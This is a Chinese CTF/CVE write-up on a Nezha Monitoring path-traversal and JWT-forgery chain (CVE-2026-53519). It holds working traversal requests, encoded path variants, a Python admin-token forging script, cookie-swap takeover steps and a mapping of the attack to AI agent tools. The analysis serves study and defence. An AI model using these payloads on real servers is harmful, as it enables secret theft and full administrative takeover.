---
id: "ctf-website/09-cve/04-nezha-path-traversal-jwt"
title: "Nezha Monitoring：路径遍历 + JWT 伪造管理员接管（CVE-2026-53519）"
title_en: "Nezha Monitoring: Path Traversal + JWT Forgery Admin Takeover (CVE-2026-53519)"
summary: >
  哪吒监控Nezha Monitoring漏洞链分析：Go语言前缀匹配（HasPrefix）非路径段匹配导致路径遍历绕过，TrimPrefix制造真正的../穿越读取config.yaml和sqlite.db，泄露HS256 JWT密钥后伪造管理员token实现完整接管。涵盖三层绕过原理、完整攻击链和路径变体。
summary_en: >
  Nezha Monitoring vulnerability chain analysis: Go string prefix matching (HasPrefix) instead of path segment matching enables path traversal bypass, TrimPrefix creates genuine ../ to read config.yaml and sqlite.db, leaking HS256 JWT secret for forging admin tokens to achieve full takeover. Covers three-layer bypass mechanism, complete attack chain, and path variants.
board: "ctf-website"
category: "09-cve"
signals: ["Nezha Monitoring", "path traversal", "JWT forgery", "HS256", "路径遍历", "JWT伪造", "CVE-2026-53519", "HasPrefix bypass"]
mcp_tools: ["kb_router", "http_probe", "workspace_write_text"]
keywords: ["CVE-2026-53519", "哪吒监控", "路径遍历", "JWT伪造", "HS256密钥泄露", "管理员接管", "Go HasPrefix绕过", "CVSS 9.1"]
difficulty: "intermediate"
tags: ["cve", "path-traversal", "jwt", "authentication", "ctf"]
language: "zh-CN"
last_updated: "2026-06-25"
related_articles: []
---
# Nezha Monitoring：路径遍历 + JWT 伪造管理员接管（CVE-2026-53519）

## 1. 受影响版本

Nezha Monitoring（哪吒监控）`< 2.0.13`。默认端口 8008。GHSA: `GHSA-5c25-7vpj-9mqh`。CVSS 3.1: 9.1 CRITICAL。

## 2. 根因：前缀匹配非路径段匹配 + HS256 密钥泄露

```go
// 有漏洞：字符串前缀匹配，非路径段匹配
if strings.HasPrefix(c.Request.URL.Path, "/dashboard") {
    stripPath := strings.TrimPrefix(c.Request.URL.Path, "/dashboard")
    localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)
}
```

### 三层绕过

**第一层：`/dashboard../` 通过前缀检查**

`/dashboard../data/config.yaml` 以 `/dashboard` 开头 → 通过 `HasPrefix`。

**第二层：TrimPrefix 制造真正的 `..`**

```text
TrimPrefix("/dashboard../data/config.yaml", "/dashboard")
    → "../data/config.yaml"
path.Join("admin-dist", "../data/config.yaml")
    → data/config.yaml
```

**第三层：Go 标准库 traversal guard 不拦截**

`/dashboard../data/config.yaml` 第一个 URL 段是 `dashboard..`，不是独立的 `..` → `http.ServeFile` 的 traversal guard 不触发。

### 认证体系直接失效

Nezha 使用 HS256 签名 JWT。拿到 `jwt_secret_key` 后可直接伪造管理员 token：

```python
import hmac, hashlib, base64, json, time

secret = "leaked_jwt_secret_key"
now = int(time.time())

header = base64.b64encode(b'{"alg":"HS256","typ":"JWT"}').decode()
payload = base64.b64encode(
    json.dumps({"user_id": 1, "ip": "", "exp": now + 3600, "orig_iat": now}).encode()
).decode()
signature = base64.b64encode(
    hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
).decode()
token = f"{header}.{payload}.{signature}"
```

## 3. 完整攻击链

```
GET /dashboard%2e%2e/data/config.yaml
    → 泄露 jwt_secret_key
    ↓
GET /dashboard%2e%2e/data/sqlite.db
    → 获取管理员 user_id
    ↓
使用泄露密钥伪造 HS256 JWT
    ↓
携带伪造 token 访问 /api/v1/profile
    → 管理员接管成功
    ↓
可进一步控制 agent 节点与监控配置
```

## 4. 可读取的敏感文件

| 文件 | 默认路径 | 风险 |
|------|---------|------|
| `config.yaml` | `data/config.yaml` | jwt_secret_key、agent_secret_key、OAuth2 凭据 |
| `sqlite.db` | `data/sqlite.db` | 用户表、管理员 ID、API token、服务器注册信息 |

## 5. 复现

```bash
# 手动 curl 验证
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2e%2e/data/config.yaml'
curl -s -i --path-as-is 'http://127.0.0.1:8008/dashboard%2e%2e/data/sqlite.db'

# 使用本仓库 PoC
cd "CVE-2026-53519 Nezha Monitoring/exploit"
python3 CVE-2026-53519.py http://127.0.0.1:8008

# 直接传入已知密钥和 user_id
python3 CVE-2026-53519.py http://127.0.0.1:8008 <jwt_secret> <user_id>
```

### 浏览器接管

伪造 JWT 后，在浏览器开发者工具中替换 Cookie `nz-jwt` 的值，刷新页面即可进入管理面板。

## 6. 路径变体

```text
/dashboard../data/config.yaml
/dashboard%2e%2e/data/config.yaml
/dashboard..%2fdata/config.yaml
```

## Evidence

记录: 路径遍历请求/响应、泄露的 jwt_secret_key、伪造的 JWT、/api/v1/profile 响应

## MCP 工具映射

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| 知识检索 | `kb_router` | 按 Nezha / 路径遍历 / JWT 伪造信号搜索 |
| HTTP 探测 | `http_probe` | 验证路径遍历和 JWT 伪造 |
| 写分析笔记 | `workspace_write_text` | 记录泄露的凭据和管理员 ID |

## 参考资料

| 来源 | 链接 |
|------|------|
| GitHub Advisory | https://github.com/nezhahq/nezha/security/advisories/GHSA-5c25-7vpj-9mqh |
| 上游 PoC | https://github.com/tar-xz/CVE-2026-53519-PoC |
| 阿里云 AVD | https://avd.aliyun.com/detail?id=AVD-2026-53519 |
| poc-lab 源 | https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-53519%20Nezha%20Monitoring |
